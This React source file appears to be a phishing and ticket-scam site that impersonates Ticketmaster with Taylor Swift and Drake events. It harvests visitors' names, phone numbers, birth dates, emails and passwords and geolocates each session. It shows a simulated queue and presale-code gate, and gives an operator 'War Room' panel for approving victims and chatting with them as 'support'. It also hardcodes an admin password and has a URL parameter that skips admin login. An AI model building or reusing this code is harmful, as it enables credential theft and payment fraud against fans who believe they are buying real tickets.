import React, { useState, useEffect } from 'react';
import { Search, CheckCircle, MessageSquare, Send, X, Bell, ShieldCheck, ChevronLeft, User, Lock, Clock, Globe, Menu, LogIn, UserPlus, Check, Ban } from 'lucide-react';
import { initializeApp } from 'firebase/app';
import { getAuth, signInAnonymously, onAuthStateChanged } from 'firebase/auth';
import { getFirestore, collection, addDoc, updateDoc, doc, setDoc, getDoc, onSnapshot, query, where, orderBy } from 'firebase/firestore';

import SeatMap from './components/SeatMap.jsx';
import Checkout from './components/Checkout.jsx';

// --- FIREBASE CONFIG ---
const firebaseConfig = {
  apiKey: import.meta.env.VITE_FIREBASE_API_KEY,
  authDomain: import.meta.env.VITE_FIREBASE_AUTH_DOMAIN,
  projectId: import.meta.env.VITE_FIREBASE_PROJECT_ID,
  storageBucket: import.meta.env.VITE_FIREBASE_STORAGE_BUCKET,
  messagingSenderId: import.meta.env.VITE_FIREBASE_MESSAGING_SENDER_ID,
  appId: import.meta.env.VITE_FIREBASE_APP_ID
};

const app = initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);
const appId = import.meta.env.VITE_APP_ID || 'default-app-id';

// --- ADMIN CREDENTIALS ---
const ADMIN_ID = "buyticketsmaster.org@gmail.com"; 
const ADMIN_PASS = "Ifeoluwapo@1!";

// --- TRANSLATIONS ---
const t = {
  EN: {
    heroTitle: "The World's Biggest Stage.",
    verified: "Verified Only",
    join: "Join Queue",
    verifyTitle: "Create Account",
    verifySub: "Verify Identity to Enter",
    loginTitle: "Welcome Back",
    loginSub: "Log in to access your tickets",
    email: "Email Address",
    name: "Full Name",
    phone: "Mobile Number",
    dob: "Date of Birth",
    pass: "Password",
    agree: "I agree to Terms & Anti-Bot Policy",
    btnJoin: "Verify & Join",
    btnLogin: "Log In",
    haveAcc: "Already have an account?",
    noAcc: "Need an account?",
    holdTitle: "Verifying Identity...",
    holdSub: "Please hold while the Host reviews your request.",
    queueTitle: "Fans Ahead of You",
    queueEst: "Estimated Wait: Less than a minute",
    unlock: "Unlock",
    presaleTitle: "Early Access",
    presaleSub: "Enter your Code to unlock seats",
    chatSupport: "Chat with Support"
  },
  ES: {
    heroTitle: "El Escenario Más Grande.",
    verified: "Solo Verificados",
    join: "Unirse a la Cola",
    verifyTitle: "Crear Cuenta",
    verifySub: "Verifica identidad para entrar",
    loginTitle: "Bienvenido de nuevo",
    loginSub: "Inicia sesión para acceder",
    email: "Correo Electrónico",
    name: "Nombre Completo",
    phone: "Número de Móvil",
    dob: "Fecha de Nacimiento",
    pass: "Contraseña",
    agree: "Acepto los Términos y Política Anti-Bot",
    btnJoin: "Verificar y Unirse",
    btnLogin: "Iniciar Sesión",
    haveAcc: "¿Ya tienes cuenta?",
    noAcc: "¿Necesitas una cuenta?",
    holdTitle: "Verificando Identidad...",
    holdSub: "Por favor espere mientras el Anfitrión revisa su solicitud.",
    queueTitle: "Fans Delante de Ti",
    queueEst: "Espera estimada: Menos de un minuto",
    unlock: "Desbloquear",
    presaleTitle: "Acceso Anticipado",
    presaleSub: "Introduce tu código",
    chatSupport: "Chatear con Soporte"
  },
  DE: {
    heroTitle: "Die Größte Bühne.",
    verified: "Nur Verifiziert",
    join: "Warteschlange beitreten",
    verifyTitle: "Konto erstellen",
    verifySub: "Identität verifizieren",
    loginTitle: "Willkommen zurück",
    loginSub: "Einloggen für Tickets",
    email: "E-Mail-Adresse",
    name: "Vollständiger Name",
    phone: "Handynummer",
    dob: "Geburtsdatum",
    pass: "Passwort",
    agree: "Ich stimme den Bedingungen zu",
    btnJoin: "Verifizieren & Beitreten",
    btnLogin: "Einloggen",
    haveAcc: "Bereits ein Konto?",
    noAcc: "Brauchen Sie ein Konto?",
    holdTitle: "Identität wird überprüft...",
    holdSub: "Bitte warten Sie auf den Host.",
    queueTitle: "Fans vor Ihnen",
    queueEst: "Geschätzte Wartezeit: Weniger als eine Minute",
    unlock: "Freischalten",
    presaleTitle: "Früher Zugang",
    presaleSub: "Code eingeben",
    chatSupport: "Support kontaktieren"
  },
  FR: {
    heroTitle: "La Plus Grande Scène.",
    verified: "Vérifié Uniquement",
    join: "Rejoindre la file",
    verifyTitle: "Créer un compte",
    verifySub: "Vérifier l'identité",
    loginTitle: "Bon retour",
    loginSub: "Connectez-vous",
    email: "Adresse e-mail",
    name: "Nom complet",
    phone: "Numéro de mobile",
    dob: "Date de naissance",
    pass: "Mot de passe",
    agree: "J'accepte les conditions",
    btnJoin: "Vérifier et Rejoindre",
    btnLogin: "Connexion",
    haveAcc: "Déjà un compte ?",
    noAcc: "Besoin d'un compte ?",
    holdTitle: "Vérification en cours...",
    holdSub: "Veuillez patienter pendant que l'hôte examine votre demande.",
    queueTitle: "Fans devant vous",
    queueEst: "Attente estimée : Moins d'une minute",
    unlock: "Déverrouiller",
    presaleTitle: "Accès Anticipé",
    presaleSub: "Entrez votre code",
    chatSupport: "Contacter le support"
  }
};

const INITIAL_EVENTS = [
  { id: 1, artist: "Taylor Swift | The Eras Tour", venue: "Wembley Stadium, London", date: "Sat • Aug 17 • 7:00 PM", image: "https://images.unsplash.com/photo-1540039155733-5bb30b53aa14?auto=format&fit=crop&q=80&w=1000", bgImage: "https://images.unsplash.com/photo-1459749411177-287ce35e8b4f?auto=format&fit=crop&q=80&w=2000", status: "presale", timeRemaining: "02:45:12" },
  { id: 2, artist: "Drake: It's All A Blur", venue: "O2 Arena, London", date: "Fri • Sep 22 • 8:00 PM", image: "https://images.unsplash.com/photo-1514525253440-b393452e8d26?auto=format&fit=crop&q=80&w=1000", bgImage: "https://images.unsplash.com/photo-1501281668745-f7f57925c3b4?auto=format&fit=crop&q=80&w=2000", status: "available", timeRemaining: "00:00:00" },
];

export default function App() {
  const [user, setUser] = useState(null);
  const [currentPage, setCurrentPage] = useState('home'); 
  const [selectedEvent, setSelectedEvent] = useState(null);
  const [cart, setCart] = useState([]); 
  const [currentSessionId, setCurrentSessionId] = useState(null);
  const [globalSettings, setGlobalSettings] = useState({ price: 250, presaleCode: 'FAN2024' });
  
  // UI State
  const [searchTerm, setSearchTerm] = useState('');
  const [showMobileSearch, setShowMobileSearch] = useState(false);
  const [lang, setLang] = useState('EN'); 
  const [showLangMenu, setShowLangMenu] = useState(false);

  // Auth/Gate State
  const [authMode, setAuthMode] = useState('signup'); // 'signup' or 'login'
  const [tempUser, setTempUser] = useState({ email: '', name: '', phone: '', dob: '', pass: '', agreed: false });
  const [presaleInput, setPresaleInput] = useState('');
  
  // Queue State
  const [queuePosition, setQueuePosition] = useState(2431);

  // Admin & Chat
  const [isChatOpen, setIsChatOpen] = useState(false);
  const [chatMessages, setChatMessages] = useState([]);
  const [isAdminLoggedIn, setIsAdminLoggedIn] = useState(false);
  const [activeNotification, setActiveNotification] = useState(null);
  const [adminUserInp, setAdminUserInp] = useState('');
  const [adminPassInp, setAdminPassInp] = useState('');
  
  // Admin Dashboard State
  const [adminTab, setAdminTab] = useState('requests'); // requests, active, events
  const [allSessions, setAllSessions] = useState([]);

  // --- INIT ---
  useEffect(() => {
    const init = async () => { try { await signInAnonymously(auth); } catch(e){} };
    init();
    return onAuthStateChanged(auth, setUser);
  }, []);

  // --- MESSENGER LINK ---
  useEffect(() => {
    const p = new URLSearchParams(window.location.search);
    if (p.get('messenger') === '123' || p.get('messenger') === 'true') {
      setIsAdminLoggedIn(true);
      setCurrentPage('admin');
    }
  }, []);

  // --- SESSION TRACKING ---
  useEffect(() => {
    if (!user) return;
    const startTracking = async () => {
      const existingSid = sessionStorage.getItem('tm_sid');
      if (existingSid) { setCurrentSessionId(existingSid); return; }

      let location = "Unknown";
      try {
        const r = await fetch('https://ipapi.co/json/');
        const d = await r.json();
        location = `${d.city}, ${d.country_name}`;
      } catch (e) { location = "Secure Tunnel"; }

      const ref = collection(db, 'artifacts', appId, 'public', 'data', 'sessions');
      const docRef = await addDoc(ref, {
        createdAt: new Date().toISOString(),
        userId: user.uid,
        location,
        status: 'browsing',
        email: 'Visitor',
        chatHistory: [{ sender: 'system', text: 'Welcome! How can we help?', timestamp: new Date().toISOString() }],
        notifications: [],
        accessGranted: false 
      });
      setCurrentSessionId(docRef.id);
      sessionStorage.setItem('tm_sid', docRef.id);
    };
    startTracking();
  }, [user]);

  // --- USER SIDE: LISTEN TO SESSION ---
  useEffect(() => {
    if (!currentSessionId) return;
    return onSnapshot(doc(db, 'artifacts', appId, 'public', 'data', 'sessions', currentSessionId), (snap) => {
      if(snap.exists()) {
        const d = snap.data();
        setChatMessages(d.chatHistory || []);
        if(d.notifications?.length > 0) setActiveNotification(d.notifications[d.notifications.length-1]);
        
        // AUTO-MOVE: If Admin Approved access
        if (d.accessGranted === true && currentPage === 'waiting_room') {
            setCurrentPage('queue');
        }
      }
    });
  }, [currentSessionId, currentPage]);

  // --- ADMIN SIDE: LISTEN TO ALL SESSIONS ---
  useEffect(() => {
    if (!isAdminLoggedIn) return;
    const q = query(collection(db, 'artifacts', appId, 'public', 'data', 'sessions'), orderBy('createdAt', 'desc'));
    return onSnapshot(q, (snap) => {
        setAllSessions(snap.docs.map(d => ({id: d.id, ...d.data()})));
    });
  }, [isAdminLoggedIn]);

  // --- SYNC GLOBAL SETTINGS ---
  useEffect(() => {
    if (!user) return;
    return onSnapshot(doc(db, 'artifacts', appId, 'public', 'data', 'config', 'global_settings'), (snap) => {
        if(snap.exists()) setGlobalSettings(snap.data());
    });
  }, [user]);

  // --- QUEUE LOGIC ---
  useEffect(() => {
      if (currentPage === 'queue') {
          const interval = setInterval(() => {
              setQueuePosition(prev => {
                  const drop = Math.floor(Math.random() * 50) + 10;
                  const newPos = prev - drop;
                  if (newPos <= 0) {
                      clearInterval(interval);
                      setCurrentPage('presale');
                      return 0;
                  }
                  return newPos;
              });
          }, 2000);
          return () => clearInterval(interval);
      }
  }, [currentPage]);

  // --- ACTIONS ---
  const updateSession = (updates) => {
    if(currentSessionId) updateDoc(doc(db, 'artifacts', appId, 'public', 'data', 'sessions', currentSessionId), updates);
  };

  // Admin Actions
  const approveUser = async (sid) => {
      await updateDoc(doc(db, 'artifacts', appId, 'public', 'data', 'sessions', sid), { accessGranted: true, status: 'in_queue' });
  };

  const handleAdminAuth = () => {
    if(adminUserInp.toLowerCase() === ADMIN_ID.toLowerCase() && adminPassInp === ADMIN_PASS) {
      setIsAdminLoggedIn(true);
      setAdminUserInp(''); setAdminPassInp('');
    } else {
      alert("Invalid credentials.");
    }
  };

  const filteredEvents = INITIAL_EVENTS.filter(e => e.artist.toLowerCase().includes(searchTerm.toLowerCase()));
  const flags = { 'EN': '🇬🇧', 'ES': '🇪🇸', 'DE': '🇩🇪', 'FR': '🇫🇷' };
  const txt = t[lang]; // Shortcut for current language text

  return (
    <div className="min-h-screen bg-[#0a0e14] text-gray-100 font-sans overflow-x-hidden selection:bg-[#026cdf] selection:text-white">
      
      {/* --- HEADER --- */}
      {!isAdminLoggedIn && (
        <header className="fixed top-0 w-full z-50 bg-[#1f262d]/90 backdrop-blur-xl border-b border-white/5 h-16 flex items-center justify-between px-4 lg:px-8 shadow-2xl">
            <div className="flex items-center gap-3 z-20">
            {currentPage !== 'home' && (
                <button onClick={() => setCurrentPage('home')} className="p-2 rounded-full hover:bg-white/10 active:scale-95 transition-all">
                <ChevronLeft className="w-5 h-5" />
                </button>
            )}
            <div className="flex items-center gap-1 cursor-pointer" onClick={() => setCurrentPage('home')}>
                <span className="font-extrabold text-xl tracking-tighter italic">ticketmaster</span>
                <CheckCircle className="w-4 h-4 text-[#026cdf] fill-current" />
            </div>
            </div>

            <div className="flex items-center gap-4 z-20">
            <div className="relative">
                <button onClick={() => setShowLangMenu(!showLangMenu)} className="flex items-center gap-1 text-sm font-bold bg-white/10 px-3 py-1.5 rounded-full hover:bg-white/20 transition-all">
                    <span>{flags[lang]}</span>
                    <span>{lang}</span>
                </button>
                {showLangMenu && (
                    <div className="absolute top-10 right-0 bg-[#1f262d] border border-white/10 rounded-xl p-2 shadow-xl flex flex-col gap-1 w-24 animate-slideDown">
                        {Object.keys(flags).map(l => (
                            <button key={l} onClick={() => {setLang(l); setShowLangMenu(false);}} className="text-left px-3 py-2 hover:bg-white/10 rounded-lg text-xs font-bold">{flags[l]} {l}</button>
                        ))}
                    </div>
                )}
            </div>
            
            <button onClick={() => setCurrentPage('admin')}><User className="w-5 h-5 text-gray-400 hover:text-white transition-colors" /></button>
            </div>
        </header>
      )}

      {/* --- MAIN CONTENT --- */}
      <main className={`min-h-screen ${!isAdminLoggedIn ? 'pt-20 pb-24 px-4 lg:px-8 max-w-7xl mx-auto' : 'bg-[#f1f5f9] text-gray-900'}`}>
        
        {currentPage === 'home' && (
          <div className="space-y-10 animate-fadeIn">
            <div className="relative h-[400px] lg:h-[500px] rounded-[40px] overflow-hidden border border-white/10 group">
              <img src="https://images.unsplash.com/photo-1540039155733-5bb30b53aa14?auto=format&fit=crop&q=80&w=2000" className="w-full h-full object-cover opacity-60 group-hover:scale-105 transition-transform duration-1000" />
              <div className="absolute inset-0 bg-gradient-to-t from-[#0a0e14] via-transparent to-transparent" />
              <div className="absolute bottom-10 left-6 lg:left-12 space-y-2">
                 <div className="inline-block bg-[#026cdf] px-3 py-1 rounded-full text-[10px] font-black uppercase tracking-widest mb-2">{txt.verified}</div>
                 <h1 className="text-4xl lg:text-7xl font-black italic uppercase tracking-tighter leading-none">{txt.heroTitle}</h1>
              </div>
            </div>

            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
              {filteredEvents.map(ev => (
                <div key={ev.id} onClick={() => { setSelectedEvent(ev); setCurrentPage('auth'); }} className="bg-[#1f262d] border border-white/5 rounded-[30px] overflow-hidden hover:border-[#026cdf] hover:translate-y-[-5px] transition-all cursor-pointer group shadow-xl">
                  <div className="h-56 relative">
                    <img src={ev.image} className="w-full h-full object-cover" />
                    <div className="absolute top-4 right-4 bg-black/60 backdrop-blur-md px-3 py-1 rounded-full text-[10px] font-black uppercase tracking-widest border border-white/10">{ev.status}</div>
                  </div>
                  <div className="p-6 space-y-4">
                    <h3 className="text-2xl font-black italic uppercase leading-none group-hover:text-[#026cdf] transition-colors">{ev.artist}</h3>
                    <div className="space-y-1 text-xs font-bold text-gray-400 uppercase tracking-widest">
                      <p>{ev.venue}</p>
                      <p className="text-gray-500">{ev.date}</p>
                    </div>
                  </div>
                </div>
              ))}
            </div>
          </div>
        )}

        {/* --- AUTH GATE (Login/Signup Toggle) --- */}
        {currentPage === 'auth' && (
           <div className="min-h-[70vh] flex items-center justify-center p-4">
              <div className="bg-white text-gray-900 w-full max-w-md p-8 rounded-[40px] shadow-2xl animate-slideUp space-y-6">
                 <div className="text-center">
                    <h2 className="text-3xl font-black italic uppercase tracking-tighter">{authMode === 'signup' ? txt.verifyTitle : txt.loginTitle}</h2>
                    <p className="text-xs font-bold text-gray-400 uppercase tracking-widest">{authMode === 'signup' ? txt.verifySub : txt.loginSub}</p>
                 </div>
                 
                 <div className="space-y-3">
                     {authMode === 'signup' && (
                        <>
                            <input className="w-full bg-gray-100 p-4 rounded-xl font-bold outline-none" placeholder={txt.name} value={tempUser.name} onChange={e => setTempUser({...tempUser, name: e.target.value})} />
                            <input className="w-full bg-gray-100 p-4 rounded-xl font-bold outline-none" placeholder={txt.phone} value={tempUser.phone} onChange={e => setTempUser({...tempUser, phone: e.target.value})} />
                            <input type="date" className="w-full bg-gray-100 p-4 rounded-xl font-bold outline-none text-gray-500" value={tempUser.dob} onChange={e => setTempUser({...tempUser, dob: e.target.value})} />
                        </>
                     )}
                     <input className="w-full bg-gray-100 p-4 rounded-xl font-bold outline-none" placeholder={txt.email} value={tempUser.email} onChange={e => setTempUser({...tempUser, email: e.target.value})} />
                     <input type="password" className="w-full bg-gray-100 p-4 rounded-xl font-bold outline-none" placeholder={txt.pass} value={tempUser.pass} onChange={e => setTempUser({...tempUser, pass: e.target.value})} />
                     
                     {authMode === 'signup' && (
                        <div className="flex items-center gap-3 pt-2">
                            <input type="checkbox" className="w-5 h-5 accent-[#026cdf]" checked={tempUser.agreed} onChange={e => setTempUser({...tempUser, agreed: e.target.checked})} />
                            <p className="text-[10px] font-bold text-gray-500">{txt.agree}</p>
                        </div>
                     )}
                 </div>

                 <button 
                   onClick={() => {
                     if(!tempUser.email || !tempUser.pass) return alert("Fill all fields");
                     if(authMode === 'signup' && !tempUser.agreed) return alert("Agree to terms");
                     
                     // Move to Waiting Room regardless of Login/Signup (Admin controls access)
                     updateSession({ 
                         email: tempUser.email, 
                         name: tempUser.name || 'Returning User', 
                         phone: tempUser.phone, 
                         status: 'waiting_approval' 
                     });
                     setCurrentPage('waiting_room');
                   }}
                   className="w-full bg-[#026cdf] text-white py-5 rounded-full font-black text-xl uppercase italic tracking-widest hover:scale-[1.02] active:scale-95 transition-all shadow-lg"
                 >
                   {authMode === 'signup' ? txt.btnJoin : txt.btnLogin}
                 </button>

                 <div className="text-center pt-2">
                     <button onClick={() => setAuthMode(authMode==='signup'?'login':'signup')} className="text-xs font-bold text-gray-400 hover:text-[#026cdf] uppercase tracking-widest">
                         {authMode === 'signup' ? txt.haveAcc : txt.noAcc}
                     </button>
                 </div>
              </div>
           </div>
        )}

        {/* --- WAITING ROOM (Admin Gate) --- */}
        {currentPage === 'waiting_room' && (
           <div className="min-h-[70vh] flex flex-col items-center justify-center text-center space-y-8 animate-fadeIn">
               <div className="w-20 h-20 border-4 border-[#026cdf] border-t-transparent rounded-full animate-spin" />
               <div className="space-y-2">
                   <h2 className="text-3xl font-black italic uppercase tracking-tighter">{txt.holdTitle}</h2>
                   <p className="text-sm font-bold text-gray-400 uppercase tracking-widest">{txt.holdSub}</p>
               </div>
               <div className="bg-[#1f262d] p-6 rounded-2xl border border-white/10 max-w-sm">
                   <p className="text-xs font-bold text-gray-500">Session ID: <span className="text-white font-mono">{currentSessionId?.slice(0,8)}...</span></p>
                   <p className="text-xs font-bold text-gray-500 mt-2">Do not refresh this page.</p>
               </div>
           </div>
        )}

        {/* --- QUEUE --- */}
        {currentPage === 'queue' && (
           <div className="min-h-[70vh] flex flex-col items-center justify-center text-center space-y-10 animate-fadeIn">
               <div className="space-y-4">
                  <div className="w-4 h-4 bg-green-500 rounded-full mx-auto animate-ping" />
                  <h2 className="text-5xl lg:text-8xl font-black italic text-white tracking-tighter">{queuePosition}</h2>
                  <p className="text-sm font-bold text-gray-400 uppercase tracking-widest">{txt.queueTitle}</p>
               </div>
               <div className="w-full max-w-md bg-white/5 h-2 rounded-full overflow-hidden">
                  <div className="h-full bg-[#026cdf] transition-all duration-1000" style={{ width: `${Math.max(5, 100 - (queuePosition/2431)*100)}%` }} />
               </div>
               <div className="flex gap-2 text-[10px] font-bold text-gray-500 uppercase tracking-widest">
                   <Clock className="w-3 h-3" /> {txt.queueEst}
               </div>
           </div>
        )}

        {/* --- PRESALE --- */}
        {currentPage === 'presale' && (
           <div className="min-h-[70vh] flex items-center justify-center p-4">
               <div className="bg-white text-gray-900 w-full max-w-md p-10 rounded-[40px] shadow-2xl animate-slideUp text-center space-y-8 border-t-8 border-[#ea0042]">
                   <ShieldCheck className="w-16 h-16 text-[#ea0042] mx-auto" />
                   <div>
                       <h2 className="text-3xl font-black italic uppercase tracking-tighter">{txt.presaleTitle}</h2>
                       <p className="text-xs font-bold text-gray-400 uppercase tracking-widest mt-2">{txt.presaleSub}</p>
                   </div>
                   <input 
                      className="w-full text-center text-3xl font-black uppercase tracking-[0.5em] border-b-4 border-gray-200 focus:border-[#ea0042] outline-none py-4"
                      placeholder="CODE"
                      value={presaleInput}
                      onChange={e => setPresaleInput(e.target.value.toUpperCase())}
                   />
                   <p className="text-[10px] font-bold text-gray-400"><span className="text-[#026cdf] cursor-pointer" onClick={()=>setIsChatOpen(true)}>{txt.chatSupport}</span></p>
                   <button 
                      onClick={() => {
                          if (presaleInput === globalSettings.presaleCode) {
                              setCurrentPage('seatmap');
                              updateSession({ status: 'viewing_map' });
                          } else {
                              alert("Invalid Presale Code");
                          }
                      }}
                      className="w-full bg-[#1f262d] text-white py-5 rounded-full font-black text-xl uppercase italic tracking-widest hover:bg-black transition-all"
                   >
                       {txt.unlock}
                   </button>
               </div>
           </div>
        )}

        {/* --- SEAT MAP --- */}
        {currentPage === 'seatmap' && (
           <SeatMap 
             event={selectedEvent} 
             globalPrice={globalSettings.price} 
             cart={cart} 
             setCart={setCart} 
             onCheckout={() => {
               updateSession({ status: 'checkout_pending', cart });
               setCurrentPage('checkout');
             }} 
           />
        )}

        {currentPage === 'checkout' && <Checkout cart={cart} onBack={() => setCurrentPage('seatmap')} onSuccess={() => setCurrentPage('success')} />}

        {currentPage === 'success' && (
          <div className="flex flex-col items-center justify-center min-h-[60vh] text-center space-y-8 animate-fadeIn">
             <div className="w-24 h-24 bg-green-500 rounded-full flex items-center justify-center shadow-[0_0_50px_#22c55e] animate-bounce">
                <CheckCircle className="w-12 h-12 text-white" />
             </div>
             <h2 className="text-4xl lg:text-6xl font-black italic uppercase tracking-tighter">Tickets Secured!</h2>
             <p className="text-gray-400 max-w-sm mx-auto font-bold text-sm">A confirmation email has been sent to {tempUser.email}.</p>
             <button onClick={() => setCurrentPage('home')} className="bg-[#1f262d] px-10 py-4 rounded-full font-black uppercase tracking-widest border border-white/20 hover:bg-white hover:text-black transition-colors">Return Home</button>
          </div>
        )}

        {/* --- SIMPLE ADMIN LOGIN SCREEN --- */}
        {currentPage === 'admin' && !isAdminLoggedIn && (
           <div className="min-h-[60vh] flex items-center justify-center p-4">
              <div className="bg-white w-full max-w-sm p-8 rounded-[30px] shadow-2xl space-y-6">
                 <h2 className="text-2xl font-black text-black uppercase italic text-center">Admin Access</h2>
                 <input placeholder="Email" className="w-full bg-gray-100 p-4 rounded-xl text-black font-bold outline-none" value={adminUserInp} onChange={e=>setAdminUserInp(e.target.value)} />
                 <input type="password" placeholder="Password" className="w-full bg-gray-100 p-4 rounded-xl text-black font-bold outline-none" value={adminPassInp} onChange={e=>setAdminPassInp(e.target.value)} />
                 <button onClick={handleAdminAuth} className="w-full bg-black text-white py-4 rounded-xl font-black uppercase">Unlock</button>
              </div>
           </div>
        )}

        {/* --- CHUNK 2: REAL ADMIN DASHBOARD --- */}
        {currentPage === 'admin' && isAdminLoggedIn && (
           <div className="min-h-screen bg-[#f1f5f9] text-gray-900 pb-20">
              {/* Admin Header */}
              <div className="bg-white p-6 sticky top-0 z-50 border-b border-gray-200 flex justify-between items-center shadow-sm">
                  <div className="flex items-center gap-3">
                      <div className="w-3 h-3 bg-green-500 rounded-full animate-pulse" />
                      <h2 className="font-black text-xl uppercase italic tracking-tighter">War Room</h2>
                  </div>
                  <button onClick={() => setIsAdminLoggedIn(false)} className="text-xs font-bold text-red-500 uppercase">Logout</button>
              </div>

              {/* Admin Tabs */}
              <div className="flex p-4 gap-4 overflow-x-auto">
                  <button onClick={() => setAdminTab('requests')} className={`px-6 py-3 rounded-full font-black uppercase text-xs tracking-widest whitespace-nowrap transition-all ${adminTab==='requests' ? 'bg-[#026cdf] text-white shadow-lg' : 'bg-white text-gray-400'}`}>
                      Gatekeeper ({allSessions.filter(s => s.status === 'waiting_approval').length})
                  </button>
                  <button onClick={() => setAdminTab('active')} className={`px-6 py-3 rounded-full font-black uppercase text-xs tracking-widest whitespace-nowrap transition-all ${adminTab==='active' ? 'bg-[#026cdf] text-white shadow-lg' : 'bg-white text-gray-400'}`}>
                      Active Users ({allSessions.filter(s => s.status !== 'waiting_approval').length})
                  </button>
              </div>

              {/* TAB: REQUESTS (THE GATE) */}
              {adminTab === 'requests' && (
                  <div className="px-4 space-y-4">
                      {allSessions.filter(s => s.status === 'waiting_approval').map(s => (
                          <div key={s.id} className="bg-white p-6 rounded-[25px] shadow-sm border-2 border-orange-100 flex flex-col gap-4">
                              <div className="flex justify-between items-start">
                                  <div>
                                      <h3 className="font-black text-lg">{s.name}</h3>
                                      <p className="text-xs font-bold text-gray-400">{s.email}</p>
                                      <p className="text-xs font-bold text-gray-400 mt-1">{s.location}</p>
                                  </div>
                                  <div className="bg-orange-100 text-orange-600 px-3 py-1 rounded-full text-[10px] font-black uppercase tracking-widest">Waiting</div>
                              </div>
                              <div className="flex gap-3">
                                  <button onClick={() => approveUser(s.id)} className="flex-1 bg-green-500 text-white py-3 rounded-xl font-black uppercase text-xs shadow-lg hover:bg-green-600 transition-all flex items-center justify-center gap-2">
                                      <Check className="w-4 h-4" /> Approve
                                  </button>
                                  <button className="flex-1 bg-red-100 text-red-500 py-3 rounded-xl font-black uppercase text-xs hover:bg-red-200 transition-all flex items-center justify-center gap-2">
                                      <Ban className="w-4 h-4" /> Deny
                                  </button>
                              </div>
                          </div>
                      ))}
                      {allSessions.filter(s => s.status === 'waiting_approval').length === 0 && (
                          <div className="text-center py-20 text-gray-400 font-bold uppercase text-xs tracking-widest">No pending requests</div>
                      )}
                  </div>
              )}

              {/* TAB: ACTIVE USERS (Simple List for now) */}
              {adminTab === 'active' && (
                  <div className="px-4 space-y-4">
                      {allSessions.filter(s => s.status !== 'waiting_approval').map(s => (
                          <div key={s.id} className="bg-white p-6 rounded-[25px] shadow-sm border border-gray-100">
                              <div className="flex justify-between items-center">
                                  <div>
                                      <h3 className="font-black text-sm">{s.name || 'Visitor'}</h3>
                                      <p className="text-[10px] font-bold text-gray-400 uppercase tracking-widest">{s.status}</p>
                                  </div>
                                  <button className="bg-gray-100 p-2 rounded-full"><MessageSquare className="w-4 h-4 text-gray-500" /></button>
                              </div>
                          </div>
                      ))}
                  </div>
              )}
           </div>
        )}

      </main>

      {/* --- LIVE CHAT WIDGET --- */}
      {/* (Only show for User, not Admin) */}
      {!isAdminLoggedIn && (
        <>
            <div className="fixed bottom-6 right-6 z-[200]">
                <button onClick={() => setIsChatOpen(!isChatOpen)} className="bg-[#026cdf] w-14 h-14 rounded-full flex items-center justify-center shadow-2xl hover:scale-110 transition-transform">
                {isChatOpen ? <X className="w-6 h-6 text-white" /> : <MessageSquare className="w-6 h-6 text-white" />}
                </button>
            </div>

            {isChatOpen && (
                <div className="fixed bottom-24 right-6 w-[90vw] max-w-sm h-[450px] bg-white rounded-[30px] shadow-2xl overflow-hidden flex flex-col z-[200] animate-slideUp">
                <div className="bg-[#1f262d] p-4 flex items-center gap-3 border-b border-white/10">
                    <div className="w-10 h-10 bg-[#026cdf] rounded-full flex items-center justify-center font-black text-white text-xs">TM</div>
                    <div><p className="font-bold text-white text-sm">Support Agent</p><p className="text-[10px] text-green-400 font-bold uppercase tracking-widest">Online</p></div>
                </div>
                <div className="flex-1 overflow-y-auto p-4 space-y-3 bg-gray-50">
                    {chatMessages.map((m,i) => (
                        <div key={i} className={`flex ${m.sender==='user'?'justify-end':'justify-start'}`}>
                            <div className={`max-w-[80%] p-3 rounded-2xl text-xs font-bold ${m.sender==='user'?'bg-[#026cdf] text-white rounded-br-none':'bg-white text-black border border-gray-100 rounded-bl-none'}`}>{m.text}</div>
                        </div>
                    ))}
                </div>
                <div className="p-3 bg-white border-t flex gap-2">
                    <input id="chat-inp" className="flex-1 bg-gray-100 rounded-xl px-4 text-sm text-black font-bold outline-none" placeholder="Message..." />
                    <button onClick={() => {
                        const el = document.getElementById('chat-inp');
                        if(el.value.trim()) {
                            const newHistory = [...chatMessages, {sender:'user', text:el.value, timestamp: new Date().toISOString()}];
                            setChatMessages(newHistory);
                            updateSession({ chatHistory: newHistory });
                            el.value = '';
                        }
                    }} className="bg-[#026cdf] p-3 rounded-xl"><Send className="w-4 h-4 text-white" /></button>
                </div>
                </div>
            )}
        </>
      )}

    </div>
  );
}


